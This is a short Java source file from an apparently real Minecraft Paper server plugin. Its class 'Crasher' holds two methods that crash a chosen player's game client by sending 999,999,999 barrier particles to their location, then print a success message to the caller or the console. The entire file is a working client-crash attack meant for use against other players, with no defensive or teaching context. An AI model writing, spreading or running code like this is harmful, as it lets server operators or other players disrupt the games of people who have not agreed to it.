package net.riyaya1528.paper.tororoassist.Utils;

import org.bukkit.Particle;
import org.bukkit.entity.Player;

public class Crasher {
    public static void CrashClientFromPlayer(Player toPlayer, Player fromPlayer) {
        toPlayer.spawnParticle(Particle.BARRIER,toPlayer.getLocation(),999999999);

        fromPlayer.sendMessage("§a§lSuccess! The player's Client has been crashed!");
    }

    public static void CrashClientFromConsole(Player toPlayer) {
        toPlayer.spawnParticle(Particle.BARRIER,toPlayer.getLocation(),999999999);

        System.out.println("§a§lSuccess! The player's Client has been crashed!");
    }
}
